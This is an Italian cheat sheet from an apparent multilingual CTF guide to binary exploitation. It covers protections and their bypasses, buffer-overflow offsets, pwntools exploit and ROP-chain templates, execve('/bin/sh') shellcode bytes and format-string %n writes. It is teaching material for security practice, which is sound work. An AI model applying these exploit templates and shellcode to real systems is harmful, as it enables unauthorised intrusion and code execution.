# 💥 Scheda di riferimento per le CTF pwn e lo sfruttamento dei binari

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Pwn-CTF.md) • [🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Analisi iniziale

```bash
# Verifica le protezioni
checksec binary

# Informazioni sul file
file binary
ldd binary        # Librerie

# Eseguilo
./binary
ltrace ./binary   # Chiamate alle librerie
strace ./binary   # Chiamate di sistema
```

---

## 🛡️ Protezioni

| Protezione | Descrizione | Aggiramento |
|------------|-------------|--------|
| **NX** | Stack non eseguibile | ROP |
| **ASLR** | Indirizzi casuali | Divulgazione di un indirizzo (leak) + calcolo |
| **PIE** | Indirizzo base del binario casuale | Divulgazione di un indirizzo del binario |
| **Canary** | Valore sentinella nello stack (stack cookie) | Divulgazione del canary |
| **RELRO** | Protezione della GOT | Uso di altre tecniche |

---

## 📏 Buffer Overflow

### Individua l'offset
```bash
# Con pwntools
cyclic 200        # Genera la sequenza
cyclic -l 0x6161616a  # Individua l'offset

# Con GDB
pattern create 200
pattern offset 0x6161616a
```

### Exploit di base (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Indirizzo di ritorno

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Individua i gadget
```bash
ROPgadget --binary binary
ropper -f binary

# Gadget comuni
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Per l'allineamento dello stack
```

### Catena ROP (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Costruisci la catena
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

> **Nota sugli esempi:** gli offset, gli indirizzi e il percorso della libc sono valori illustrativi. Il frammento ROP presuppone che `offset` sia già definito e mostra solo la costruzione del payload. Le righe con gadget sono istruzioni assembly, non comandi della shell; i comandi `pattern` richiedono un'estensione di GDB compatibile.

## 🐚 Shellcode

> **Nota sullo shellcode:** `shellcraft` e `asm` dipendono dal contesto architetturale di pwntools; il frammento originale non ne mostra l'inizializzazione.

### Linux a 64 bit
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manualmente
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Vulnerabilità delle stringhe di formato (format string)

```bash
# Divulga i valori
%p %p %p %p %p
%x %x %x %x %x

# Scrivi
%n - scrive il numero di byte stampati
%hhn - scrive un byte
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Strumenti

| Strumento | Utilizzo |
|------|-----|
| **pwntools** | Libreria Python per pwn |
| **GDB + GEF** | Debugging |
| **ROPgadget** | Ricerca di gadget ROP |
| **one_gadget** | Ricerca di gadget one-shot nella libc |
| **checksec** | Verifica delle protezioni |

---

## 📋 Checklist per pwn

```markdown
□ checksec binary
□ Individua la vulnerabilità (overflow, format string)
□ Calcola l'offset
□ Verifica le protezioni
□ Costruisci l'exploit (shellcode/ROP)
□ Prova in locale
□ Adatta all'ambiente remoto
```

---

**Torna alle CTF:** [🏁 Panoramica CTF](./README.it.md)
